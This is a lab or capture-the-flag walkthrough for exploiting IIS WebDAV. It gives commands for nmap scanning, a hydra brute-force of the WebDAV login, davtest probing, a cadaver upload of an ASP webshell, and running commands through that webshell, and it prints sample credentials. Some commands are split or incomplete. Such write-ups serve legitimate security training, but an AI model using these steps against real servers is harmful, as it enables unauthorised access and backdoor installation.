# Exploiting Microsoft IIS WebDAV

## Overview

This document details the process of exploiting a Microsoft IIS WebDAV server. It includes basic information about IIS and WebDAV, steps for identifying and exploiting WebDAV vulnerabilities, and a list of tools used in the process.

## Microsoft IIS

- **IIS (Internet Information Services)**: Proprietary web server software developed by Microsoft for the Windows NT family.
- **Usage**: Hosting websites and web applications with a robust GUI for managing them.
- **Supported File Types**: .asp, .aspx, .config, .php.
- **Ports**: Typically runs on port 80 (HTTP) or 443 (HTTPS with SSL certificate).

## WebDAV

- **WebDAV (Web-based Distributed Authoring and Versioning)**: Extensions to the HTTP protocol allowing collaborative file management on remote web servers.
- **Functionality**: Enables a web server to act as a file server.
- **Ports**: Operates on the same ports as IIS (80/443).
- **Authentication**: Requires legitimate credentials (username and password).

## WebDAV Exploitation

1. **Identification**: Determine if WebDAV is configured on the IIS server.
2. **Brute-force Attack**: Identify legitimate credentials for authentication.
3. **Exploitation**: Authenticate with the server and upload a malicious payload (e.g., .asp file) to execute commands or obtain a reverse shell.

## Tools

- **davtest**: Scans, authenticates, and exploits WebDAV servers. Pre-installed on offensive testing distros like Kali and Parrot.
- **cadaver**: Supports file operations (upload, download, delete) and resource locking on WebDAV servers. Also pre-installed on offensive testing distros.

## Credentials

| Username | Password         |
|----------|------------------|
| bob      | password_123321  |

## Basic Scans

1. **Initial Scan**: Identify open ports and services.

nmap -sV -sC 10.2.23.231

2. **Service Enumeration**: Identify directories and services on port 80.

`nmap -sV -p 80 --script=http-enum 10.2.23.231`
`Reveals the presence of the WebDAV directory.`

### Brute Force Authentication

`hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.23.231 http-get /webdav/`
Perform a brute-force attack on the WebDAV authentication form:

### Running davtest

1. **Without Authentication**:

davtest -url http://10.2.23.231/webdav
- Fails due to lack of authentication.

2. **With Authentication**:

davtest -auth bob
`-url http://10.2.23.231/webdav`
- Enumerates executable file formats and uploads to the /webdav directory.

### Uploading a .asp Backdoor

`cadaver http://10.2.23.231/webdav`
using cadaver

`put /usr/share/webshells/asp/webshell.asp`
Upload backdoor

3. **List directory**:

`ls`
- Confirms the upload of the backdoor.

### Exploiting the Backdoor

1. **Access Webshell**:
- Open the browser and navigate to `http://10.2.23.231/webdav/webshell.asp`.
2. **Execute Commands**:
- Example commands to list directory and view a file:

  `dir C:\`
  `type c:\flag.txt`

  







  
